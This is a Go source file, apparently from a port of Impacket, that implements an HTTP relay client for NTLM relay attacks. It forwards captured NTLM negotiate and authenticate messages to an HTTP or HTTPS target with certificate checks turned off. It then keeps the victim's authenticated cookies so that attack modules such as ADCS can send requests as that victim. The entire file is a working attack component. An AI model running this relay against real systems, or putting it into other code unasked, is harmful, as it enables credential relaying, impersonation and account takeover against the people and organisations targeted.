package relay

import (
	"crypto/tls"
	"encoding/base64"
	"fmt"
	"io"
	"log"
	"net"
	"net/http"
	"regexp"
	"strings"

	"gopacket/internal/build"
)

// HTTPRelayClient implements ProtocolClient for relaying NTLM auth to HTTP/HTTPS targets.
// Matches Impacket's httprelayclient.py behavior.
type HTTPRelayClient struct {
	targetAddr string
	useTLS     bool
	httpClient *http.Client
	authMethod string // "NTLM" or "Negotiate"
	path       string // URL path (default "/")
	query      string // URL query string

	// Cookies from authenticated response (for use by attack modules)
	cookies    []*http.Cookie
	lastResult []byte
	authenticated bool
}

// NewHTTPRelayClient creates a new HTTP relay client.
func NewHTTPRelayClient(addr string, useTLS bool) *HTTPRelayClient {
	return &HTTPRelayClient{
		targetAddr: addr,
		useTLS:     useTLS,
		path:       "/",
	}
}

// SetPath sets the URL path for NTLM negotiation requests.
// Matches Impacket's initConnection() which preserves self.target.path.
func (c *HTTPRelayClient) SetPath(path string) {
	if path == "" {
		return
	}
	// Split path and query string
	if idx := strings.Index(path, "?"); idx >= 0 {
		c.path = path[:idx]
		c.query = path[idx+1:]
	} else {
		c.path = path
	}
}

// InitConnection creates the HTTP client with connection reuse for NTLM handshake.
// Implements ProtocolClient.
func (c *HTTPRelayClient) InitConnection() error {
	// Use a custom transport that keeps connections alive for the NTLM handshake.
	// The entire 3-leg NTLM exchange must happen on the same TCP connection.
	transport := &http.Transport{
		TLSClientConfig: &tls.Config{
			InsecureSkipVerify: true,
		},
		DisableKeepAlives: false,
		// Force single connection reuse for NTLM auth
		MaxIdleConnsPerHost: 1,
		DialContext: (&net.Dialer{
			Timeout: 10 * 1e9, // 10 seconds
		}).DialContext,
	}

	c.httpClient = &http.Client{
		Transport: transport,
		// Don't follow redirects — we need to see the raw 401/302 responses
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}

	return nil
}

// baseURL returns the scheme://host base URL.
func (c *HTTPRelayClient) baseURL() string {
	scheme := "http"
	if c.useTLS {
		scheme = "https"
	}
	return fmt.Sprintf("%s://%s", scheme, c.targetAddr)
}

// SendNegotiate relays the NTLM Type1 and returns the Type2 challenge from the target.
// Matches Impacket's sendNegotiate(): initial GET to check auth, then GET with Type1.
// Implements ProtocolClient.
func (c *HTTPRelayClient) SendNegotiate(ntlmType1 []byte) ([]byte, error) {
	url := c.baseURL() + c.path
	if c.query != "" {
		url += "?" + c.query
	}

	// Step 1: Initial GET to check if server requires NTLM auth
	req, err := http.NewRequest("GET", url, nil)
	if err != nil {
		return nil, fmt.Errorf("create request: %v", err)
	}
	resp, err := c.httpClient.Do(req)
	if err != nil {
		return nil, fmt.Errorf("initial GET failed: %v", err)
	}
	io.Copy(io.Discard, resp.Body)
	resp.Body.Close()

	if resp.StatusCode != 401 {
		if build.Debug {
			log.Printf("[D] HTTP relay client: status %d (auth may not be required)", resp.StatusCode)
		}
	}

	// Check all WWW-Authenticate headers (IIS sends one per scheme).
	// Python's getheader() concatenates all matching headers; Go's Get() only returns the first.
	// Prefer NTLM over Negotiate to avoid Kerberos negotiation (matches Impacket).
	wwwAuthValues := resp.Header.Values("WWW-Authenticate")
	wwwAuthAll := strings.Join(wwwAuthValues, ", ")
	if strings.Contains(wwwAuthAll, "NTLM") {
		c.authMethod = "NTLM"
	} else if strings.Contains(wwwAuthAll, "Negotiate") {
		c.authMethod = "Negotiate"
	} else {
		// IIS cert server may allow anonymous authentication, try NTLM anyway (matches Impacket ADCS fallback)
		if build.Debug {
			log.Printf("[D] HTTP relay client: no NTLM auth offered (WWW-Authenticate: %s), trying NTLM anyway", wwwAuthAll)
		}
		c.authMethod = "NTLM"
	}

	// Step 2: Send Type1 negotiate
	negotiate := base64.StdEncoding.EncodeToString(ntlmType1)
	req2, err := http.NewRequest("GET", url, nil)
	if err != nil {
		return nil, fmt.Errorf("create negotiate request: %v", err)
	}
	req2.Header.Set("Authorization", fmt.Sprintf("%s %s", c.authMethod, negotiate))

	resp2, err := c.httpClient.Do(req2)
	if err != nil {
		return nil, fmt.Errorf("negotiate GET failed: %v", err)
	}
	io.Copy(io.Discard, resp2.Body)
	resp2.Body.Close()

	// Extract Type2 challenge from WWW-Authenticate header(s)
	challengeHeaders := resp2.Header.Values("WWW-Authenticate")
	if len(challengeHeaders) == 0 {
		return nil, fmt.Errorf("no WWW-Authenticate in challenge response")
	}

	// Search all WWW-Authenticate headers for the NTLM challenge blob
	re := regexp.MustCompile(fmt.Sprintf(`%s\s+([a-zA-Z0-9+/]+=*)`, regexp.QuoteMeta(c.authMethod)))
	var matches []string
	for _, h := range challengeHeaders {
		if m := re.FindStringSubmatch(h); len(m) >= 2 {
			matches = m
			break
		}
	}
	if len(matches) < 2 {
		return nil, fmt.Errorf("no NTLM challenge in WWW-Authenticate: %v", challengeHeaders)
	}

	type2, err := base64.StdEncoding.DecodeString(matches[1])
	if err != nil {
		return nil, fmt.Errorf("decode challenge: %v", err)
	}

	if build.Debug {
		log.Printf("[D] HTTP relay client: got Type2 challenge (%d bytes) via %s", len(type2), c.authMethod)
	}

	return type2, nil
}

// SendAuth relays the NTLM Type3 authenticate to the target.
// Unwraps SPNEGO if present (matching Impacket behavior).
// Implements ProtocolClient.
func (c *HTTPRelayClient) SendAuth(ntlmType3 []byte) error {
	// Unwrap SPNEGO if needed (SMB server wraps Type3 in SPNEGO NegTokenResp)
	token := unwrapSPNEGOType3(ntlmType3)

	url := c.baseURL() + c.path
	if c.query != "" {
		url += "?" + c.query
	}

	auth := base64.StdEncoding.EncodeToString(token)
	req, err := http.NewRequest("GET", url, nil)
	if err != nil {
		return fmt.Errorf("create auth request: %v", err)
	}
	req.Header.Set("Authorization", fmt.Sprintf("%s %s", c.authMethod, auth))

	resp, err := c.httpClient.Do(req)
	if err != nil {
		return fmt.Errorf("auth GET failed: %v", err)
	}

	c.lastResult, _ = io.ReadAll(resp.Body)
	resp.Body.Close()
	c.cookies = resp.Cookies()

	if resp.StatusCode == 401 {
		return fmt.Errorf("authentication failed (401)")
	}

	// Impacket treats any non-401 as success
	if build.Debug {
		log.Printf("[D] HTTP relay client: auth response status=%d, treating as success", resp.StatusCode)
	}
	c.authenticated = true

	return nil
}

// GetSession returns this client for use by attack modules.
// Implements ProtocolClient.
func (c *HTTPRelayClient) GetSession() interface{} {
	return c
}

// KeepAlive sends a HEAD request to keep the connection alive.
// Implements ProtocolClient.
func (c *HTTPRelayClient) KeepAlive() error {
	url := c.baseURL() + "/favicon.ico"
	req, _ := http.NewRequest("HEAD", url, nil)
	resp, err := c.httpClient.Do(req)
	if err != nil {
		return err
	}
	io.Copy(io.Discard, resp.Body)
	resp.Body.Close()
	return nil
}

// Kill terminates the connection.
// Implements ProtocolClient.
func (c *HTTPRelayClient) Kill() {
	if c.httpClient != nil {
		c.httpClient.CloseIdleConnections()
	}
}

// IsAdmin returns false — HTTP doesn't have an admin check concept.
// Implements ProtocolClient.
func (c *HTTPRelayClient) IsAdmin() bool {
	return false
}

// DoRequest makes an authenticated HTTP request using the relayed session.
// Used by attack modules (e.g., ADCS) to interact with the target after auth.
func (c *HTTPRelayClient) DoRequest(method, path, body string, headers map[string]string) (*http.Response, error) {
	url := c.baseURL() + path

	var bodyReader io.Reader
	if body != "" {
		bodyReader = strings.NewReader(body)
	}

	req, err := http.NewRequest(method, url, bodyReader)
	if err != nil {
		return nil, fmt.Errorf("create request: %v", err)
	}

	// Add custom headers
	for k, v := range headers {
		req.Header.Set(k, v)
	}

	// Add cookies from authenticated session
	for _, cookie := range c.cookies {
		req.AddCookie(cookie)
	}

	return c.httpClient.Do(req)
}
